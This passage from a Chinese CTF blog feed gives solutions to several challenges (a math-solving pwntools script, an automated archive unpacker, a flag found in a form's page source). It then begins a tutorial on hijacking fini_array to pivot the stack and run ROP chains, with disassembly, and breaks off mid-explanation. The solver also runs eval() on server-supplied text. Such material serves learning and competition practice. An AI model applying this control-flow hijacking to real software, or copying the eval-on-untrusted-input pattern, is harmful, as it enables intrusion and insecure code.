class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'212.47.229.1'</span>, <span class="number">33003</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">op = &#123;<span class="string">'XOR'</span>:<span class="string">'^'</span>, <span class="string">'OR'</span>:<span class="string">'|'</span>, <span class="string">'AND'</span>:<span class="string">'&amp;'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(ans=<span class="string">'-1'</span>)</span>:</span></span><br><span class="line">    ru(<span class="string">'[&gt;]'</span>)</span><br><span class="line">    data = ru(<span class="string">'\n'</span>)</span><br><span class="line">    ru(<span class="string">'[&gt;]'</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    data = data.split()</span><br><span class="line">    res = eval(data[<span class="number">0</span>]+op[data[<span class="number">1</span>]]+data[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">if</span>(ans!=<span class="string">'-1'</span>):</span><br><span class="line">        sl(ans)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(str(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br><span class="line"><span class="comment"># find flag after 100 times </span></span><br><span class="line"><span class="comment"># FLAG&#123;0HH_Y0UR3_4_V3RY_5M3RT_M4TH3M4T1C&#125;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Deep-dive"><a href="#Deep-dive" class="headerlink" title="Deep dive"></a>Deep dive</h2><ul><li><p>题目描述：</p><blockquote><p>Worth digging into these tricks.</p><p><a href="https://img.vos.uz/874pxugc.jpg" data-fancybox="group" data-caption="dd" class="fancybox"><img alt="dd" title="dd" data-src="https://img.vos.uz/874pxugc.jpg" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：批处理脚本</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：701</p></li><li><p>完成人数：174</p></li></ul><p>题目给了附件<code>flag.txt</code>，用<code>file</code>指令识别下，发现它实际上是个压缩包</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file flag.txt</span></span><br><span class="line">flag.txt: POSIX tar archive (GNU)</span><br></pre></td></tr></table></figure></div><p>经过解压后还是个压缩包，但是换了一种压缩方式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar xvf flag.txt</span></span><br><span class="line">./</span><br><span class="line">./flag.txt</span><br><span class="line"><span class="meta">$</span><span class="bash"> file flag.txt</span></span><br><span class="line">flag.txt: Zip archive data, at least v2.0 to extract</span><br></pre></td></tr></table></figure></div><p>至此大概明白这题要考察的就是自动解压缩包，不同压缩类型的压缩包需要不同的指令来解压，所以此题关键在于正确识别文件类型。python有个filetype库可以实现文件类型识别。</p><p>根据压缩包类型解压，大概解压700多次就有flag了（膜<a href="https://www.gem-love.com/" target="_blank" rel="noopener">Y1ng</a>师傅手动解压300余次）脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    kind = filetype.guess(<span class="string">'./flag.txt'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> kind:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"right! flag is:"</span></span><br><span class="line">        system(<span class="string">"cat ./flag.txt"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> kind.extension == <span class="string">'xz'</span>:</span><br><span class="line">        system(<span class="string">'mv ./flag.txt ./flag.xz'</span>)</span><br><span class="line">        system(<span class="string">'xz -d ./flag.xz'</span>)</span><br><span class="line">        system(<span class="string">'mv ./flag ./flag.txt'</span>)</span><br><span class="line">    <span class="keyword">elif</span> kind.extension == <span class="string">'gz'</span>:</span><br><span class="line">        system(<span class="string">'mv ./flag.txt ./flag.gz'</span>)</span><br><span class="line">        system(<span class="string">'gzip -d ./flag.gz'</span>)</span><br><span class="line">        system(<span class="string">'mv ./flag ./flag.txt'</span>)</span><br><span class="line">    <span class="keyword">elif</span> kind.extension == <span class="string">'tar'</span>:</span><br><span class="line">        system(<span class="string">'tar xvf ./flag.txt'</span>)</span><br><span class="line">    <span class="keyword">elif</span> kind.extension == <span class="string">'zip'</span>:</span><br><span class="line">        system(<span class="string">'mv ./flag.txt ./flag.zip'</span>)</span><br><span class="line">        system(<span class="string">'unzip ./flag.zip'</span>)</span><br><span class="line">        system(<span class="string">'rm ./flag.zip'</span>)</span><br><span class="line">    <span class="keyword">elif</span> kind.extension == <span class="string">'bz2'</span>:</span><br><span class="line">        system(<span class="string">'bzip2 -d flag.txt'</span>)</span><br><span class="line">        system(<span class="string">'mv ./flag.txt.out ./flag.txt'</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n times %d"</span>%i</span><br><span class="line"><span class="comment"># FLAG&#123;matri0sha256&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="True-Detective"><a href="#True-Detective" class="headerlink" title="True Detective"></a>True Detective</h2><ul><li><p>题目描述：</p><blockquote><p>And now it’s time to show the skills of a real detective! </p><p><a href="https://clck.ru/MCop6" target="_blank" rel="noopener">https://clck.ru/MCop6</a></p><p><a href="https://img.vos.uz/df1htz3j.jpg" data-fancybox="group" data-caption="td" class="fancybox"><img alt="td" title="td" data-src="https://img.vos.uz/df1htz3j.jpg" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：信息搜索、源码分析</p></li><li><p>难度：简单</p></li><li><p>初始分值：2000</p></li><li><p>最终分值：1681</p></li><li><p>完成人数：124</p></li></ul><p>题目描述给的链接是个google文档，打开之后这样：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217023856.png" data-fancybox="group" data-caption="doc" class="fancybox"><img alt="doc" title="doc" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217023856.png" src="/img/loading.gif" class="lazyload"></a></p><p>要求回答5个关于伦敦的问题，天真的我以为这题是要考搜索能力，于是google了这个图片（图片店名被挡住了），发现这家店全名叫做<code>Testo</code>，输入<code>Testo</code>给了flag的第一部分</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217024413.png" data-fancybox="group" data-caption="right" class="fancybox"><img alt="right" title="right" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217024413.png" src="/img/loading.gif" class="lazyload"></a></p><p>后来越往后做越难，什么根据图片找出地名、图片中的是哪国大使馆、这是什么公园之类的…这谁知道呀</p><p>于是审查了一下网页元素，搜索<code>FLAG{08</code>发现flag其实就在源码中……而且是通过js判断答案的：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> FB_PUBLIC_LOAD_DATA_ = [<span class="literal">null</span>,[<span class="string">"Let's see how well you know London."</span>,</span><br><span class="line">[[<span class="number">673760842</span>,<span class="string">"What is the name of the store?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">255559616</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,</span><br><span class="line">[[<span class="number">4</span>,<span class="number">300</span>,[<span class="string">"(tesco|Testo)"</span>] ,<span class="string">"1 - FLAG&#123;08"</span>] ] ] ] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1cTysniECWio21dKH90wnnzNxlB4gKBJI7Bri1Q_K4moAtg"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">385</span>,<span class="number">0</span>] ] ] ] ,</span><br><span class="line">[<span class="number">2014750817</span>,<span class="string">"What is the name of this place?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">1092335700</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,</span><br><span class="line">[[<span class="number">4</span>,<span class="number">300</span>,[<span class="string">"(bridport|Bridport)"</span>] ,<span class="string">"2 - c49c3d9a"</span>] ] ] ] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1sd8oiCWcjd1_HiCrOA2f1hrgkknzJvT_Y-tVgx5qjBanKw"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">417</span>,<span class="number">0</span>] ] ] ] ,</span><br><span class="line">[<span class="number">771036932</span>,<span class="string">"Very beautiful Park where Sherlock likes to walk. Where is it?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">1600364512</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,</span><br><span class="line">[[<span class="number">4</span>,<span class="number">300</span>,[<span class="string">"(finsbury|Finsbury)"</span>] ,<span class="string">"3 - e8898343"</span>] ] ] ] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1-w_MvKBaer5I78ICXo70E94lH4vKSPmCRekszxbOblJRvA"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">377</span>,<span class="number">0</span>] ] ] ] ,</span><br><span class="line">[<span class="number">302390155</span>,<span class="string">"Every Englishman has been to this square at least once"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">661956933</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,</span><br><span class="line">[[<span class="number">4</span>,<span class="number">300</span>,[<span class="string">"(euston|Euston)"</span>] ,<span class="string">"4 - 7729747b"</span>] ] ] ] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1sGu1uvZD9tXdbS0ypGTsI05LDj8Bd1U03VV_vjDLI3bY6A"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">385</span>,<span class="number">0</span>] ] ] ] ,</span><br><span class="line">[<span class="number">1070034509</span>,<span class="string">"Which Embassy building is shown in the photo"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">2072641709</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,</span><br><span class="line">[[<span class="number">4</span>,<span class="number">300</span>,[<span class="string">"(hungary|Hungary)"</span>] ,<span class="string">"5 - cf1be8&#125;"</span>] ] ] ] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"174eoWKRoyVKEN21KJigFwwry_DncqoZfVECN_p6i85oWRw"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">376</span>,<span class="number">0</span>] ] ] ] ] </span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[<span class="number">0</span>,<span class="number">0</span>] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="string">"Task"</span>,<span class="number">48</span>,[<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">0</span>] ,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[<span class="number">2</span>] ]</span><br><span class="line">,<span class="string">"/forms"</span>,<span class="string">"Новая форма"</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="string">""</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="string">"e/1FAIpQLSdpESvbfK_dafCvhkTjcLK1KBMwklUgYcy-J0mu3g_jjgisRw"</span>,<span class="number">0</span>,<span class="string">"[]"</span>,<span class="number">0</span>];</span><br></pre></td></tr></table></figure></div><p>flag有5部分，拼全就是答案：</p><blockquote><p>1 - FLAG{08<br>2 - c49c3d9a<br>3 - e8898343<br>4 - 7729747b<br>5 - cf1be8}</p><p>FLAG{08c49c3d9ae88983437729747bcf1be8}</p></blockquote><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>国际小比赛，题型和国内CTF有所不同，挺好玩儿的，以后有时间还玩儿~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> ppc </tag>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过利用fini_array部署并启动ROP攻击</title>
      <link href="/2020/02/14/play-ROP-with-fini-array/"/>
      <url>/2020/02/14/play-ROP-with-fini-array/</url>
      
        <content type="html"><![CDATA[<p>这篇文章源自<a href="https://pwnable.tw/" target="_blank" rel="noopener">pwnable.tw</a>上的一道题目<code>3x17</code>，其中用到了<code>fini_array</code>劫持，比较有意思，于是写篇文章分析记录总结一下关于<code>fini_array</code>的利用方式~</p><h1 id="0x0-背景"><a href="#0x0-背景" class="headerlink" title="0x0 背景"></a>0x0 背景</h1><p>用<code>gdb</code>调试<code>main</code>函数的时候，不难发现<code>main</code>的返回地址是<code>__libc_start_main</code></p><p>也就是说<code>main</code>并不是程序真正开始的地方，<code>__libc_start_main</code>是<code>main</code>的爸爸</p><p>然鹅，<code>__libc_start_main</code>也有爸爸，他就是<code>_start</code></p><p>也就是<code>Entry point</code>程序的进入点啦，可以通过<code>readelf -h</code>查看：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2's complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - GNU</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x401a60</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          835672 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         8</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br></pre></td></tr></table></figure></div><blockquote><p>这是一个64位静态编译的ELF程序</p></blockquote><p>其中，<code>Entry point address: 0x401a60</code>就是<code>_start</code>的地址：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A60                 <span class="keyword">public</span> start</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A60 start           proc near               </span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A60 ; __unwind &#123;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A60                 <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A62                 mov     r9, rdx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A65                 pop     rsi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A66                 mov     rdx, rsp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A69                 <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A6D                 push    rax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A6E                 push    rsp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A7D                 mov     rdi, offset main</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A84                 db      <span class="number">67</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A84                 call    __libc_start_main</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A8A                 hlt</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A8A ; &#125; <span class="comment">// starts at 401A60</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000401</span>A8A start           endp</span><br></pre></td></tr></table></figure></div><blockquote><p>64位程序通过寄存器来保存函数参数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rdi - first argument</span><br><span class="line">rsi - second argument</span><br><span class="line">rdx - third argument</span><br><span class="line">rcx - fourth argument</span><br><span class="line">r8  - fifth argument</span><br><span class="line">r9  - sixth argument</span><br></pre></td></tr></table></figure></div></blockquote><h1 id="0x1-libc-start-main分析"><a href="#0x1-libc-start-main分析" class="headerlink" title="0x1 __libc_start_main分析"></a>0x1 __libc_start_main分析</h1><p>对应<code>_start</code>的代码，可以发现<code>__libc_start_main</code>函数的参数中，有3个是函数指针：</p><ul><li><code>rdi</code> &lt;- <code>main</code></li><li><code>rcx</code> &lt;- <code>__libc_csu_init</code></li><li><code>r8</code>  &lt;-  <code>__libc_csu_fini</code></li></ul><p>不难想到，除<code>main</code>以外的这两位兄弟，一位在<code>main</code>开始执行前执行，一位在<code>main</code>执行完毕后执行</p><h2 id="libc-csu-fini函数"><a href="#libc-csu-fini函数" class="headerlink" title="__libc_csu_fini函数"></a>__libc_csu_fini函数</h2><p><code>__libc_csu_fini</code>就是在<code>main</code>执行完毕后执行的那位，这兄弟虽然只有短短几行指令，但是能利用的点却不少，他长这样：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>i <span class="number">0x402bd0</span></span><br><span class="line">   <span class="number">0x402bd0</span> &lt;__libc_csu_fini&gt;:push   rbp</span><br><span class="line">   <span class="number">0x402bd1</span> &lt;__libc_csu_fini+<span class="number">1</span>&gt;:lea    rax,[rip+<span class="number">0xb24e8</span>]        # <span class="number">0x4b50c0</span> </span><br><span class="line">   <span class="number">0x402bd8</span> &lt;__libc_csu_fini+<span class="number">8</span>&gt;:lea    rbp,[rip+<span class="number">0xb24d1</span>]        # <span class="number">0x4b50b0</span> </span><br><span class="line">   <span class="number">0x402bdf</span> &lt;__libc_csu_fini+<span class="number">15</span>&gt;:push   rbx</span><br><span class="line">   <span class="number">0x402be0</span> &lt;__libc_csu_fini+<span class="number">16</span>&gt;:sub    rax,rbp</span><br><span class="line">   <span class="number">0x402be3</span> &lt;__libc_csu_fini+<span class="number">19</span>&gt;:sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x402be7</span> &lt;__libc_csu_fini+<span class="number">23</span>&gt;:sar    rax,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x402beb</span> &lt;__libc_csu_fini+<span class="number">27</span>&gt;:je     <span class="number">0x402c06</span> &lt;__libc_csu_fini+<span class="number">54</span>&gt;</span><br><span class="line">   <span class="number">0x402bed</span> &lt;__libc_csu_fini+<span class="number">29</span>&gt;:lea    rbx,[rax<span class="number">-0x1</span>]</span><br><span class="line">   <span class="number">0x402bf1</span> &lt;__libc_csu_fini+<span class="number">33</span>&gt;:nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x402bf8</span> &lt;__libc_csu_fini+<span class="number">40</span>&gt;:call   QWORD PTR [rbp+rbx*<span class="number">8</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x402bfc</span> &lt;__libc_csu_fini+<span class="number">44</span>&gt;:sub    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x402c00</span> &lt;__libc_csu_fini+<span class="number">48</span>&gt;:cmp    rbx,<span class="number">0xffffffffffffffff</span></span><br><span class="line">   <span class="number">0x402c04</span> &lt;__libc_csu_fini+<span class="number">52</span>&gt;:jne    <span class="number">0x402bf8</span> &lt;__libc_csu_fini+<span class="number">40</span>&gt;</span><br><span class="line">   <span class="number">0x402c06</span> &lt;__libc_csu_fini+<span class="number">54</span>&gt;:add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x402c0a</span> &lt;__libc_csu_fini+<span class="number">58</span>&gt;:pop    rbx</span><br><span class="line">   <span class="number">0x402c0b</span> &lt;__libc_csu_fini+<span class="number">59</span>&gt;:pop    rbp</span><br><span class="line">   <span class="number">0x402c0c</span> &lt;__libc_csu_fini+<span class="number">60</span>&gt;:jmp    <span class="number">0x48f52c</span> &lt;_fini&gt;</span><br></pre></td></tr></table></figure></div><p>下面先概括的说下这个函数可利用的点，在后面会详细分析</p><h2 id="利用方式-栈迁移"><a href="#利用方式-栈迁移" class="headerlink" title="利用方式 - 栈迁移"></a>利用方式 - 栈迁移</h2><p>首先，看下面这条指令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bd8</span>: lea rbp,[rip+<span class="number">0xb24d1</span>] # <span class="number">0x4b50b0</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>rbp = 0x4b50b0</code>，<code>0x4b50b0</code>是<code>fini_array</code>的首地址</p></blockquote><p>这条指令相当于<code>lea rbp,[fini_array]</code>，因此，在这里配合<code>gadget</code>:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave ; (mov rsp,ebp; pop rbp)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div><p>便可以把<strong>栈迁移</strong>到<code>fini_array</code>（<code>fini_array</code>存储的函数指针，可能有<strong>写权限</strong>）</p><h2 id="利用方式-控制流劫持"><a href="#利用方式-控制流劫持" class="headerlink" title="利用方式 - 控制流劫持"></a>利用方式 - 控制流劫持</h2><p>下面还有一条<code>call</code>指令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x402bf8</span>: call QWORD PTR [rbp+rbx*<span 